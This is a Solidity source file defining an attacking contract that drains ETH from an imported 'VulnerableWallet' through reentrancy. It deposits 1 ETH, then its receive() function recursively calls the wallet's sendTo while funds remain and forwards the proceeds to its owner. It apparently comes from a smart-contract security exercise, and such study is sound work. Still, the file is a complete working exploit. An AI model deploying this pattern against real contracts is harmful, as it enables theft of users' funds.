// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableWallet.sol";

interface WalletI {
    // This is the interface of the wallet to be attacked.
    function deposit() external payable;
    function sendTo(address payable dest) external;
}

contract WalletAttack {
    // A contract used to attack the Vulnerable Wallet.
    address payable public owner;
    
    constructor() {
        // The constructor for the attacking contract.
        owner = payable(msg.sender);
    }

    receive() external payable {
        // Attack logic: recursively call sendTo if the wallet has funds
        // We want to drain at least 3 ETH total.
        // The exploit starts with 1 ETH deposit.
        // Each recursion steals 1 ETH.
        
        // Check if vulnerable wallet has balance >= 1 ETH
        // We use msg.sender as the target wallet address because it called us.
        WalletI target = WalletI(msg.sender);
        
        // Check balance of target. We need to cast to address to get balance.
        uint256 targetBalance = address(target).balance;
        
        if (targetBalance >= 1 ether) {
            target.sendTo(payable(address(this)));
        }
    }

    function exploit(WalletI _target) public payable {
        // runs the exploit on the target wallet.
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        require(msg.value == 1 ether, "Must send exactly 1 ether to exploit");
        
        // 1. Deposit 1 Ether to the target to set our balance to 1 ETH
        _target.deposit{value: 1 ether}();
        
        // 2. Withdraw the 1 Ether, triggering receive() and reentrancy
        _target.sendTo(payable(address(this)));
        
        // 3. After recursion finishes, transfer all funds to owner
        owner.transfer(address(this).balance);
    }
}
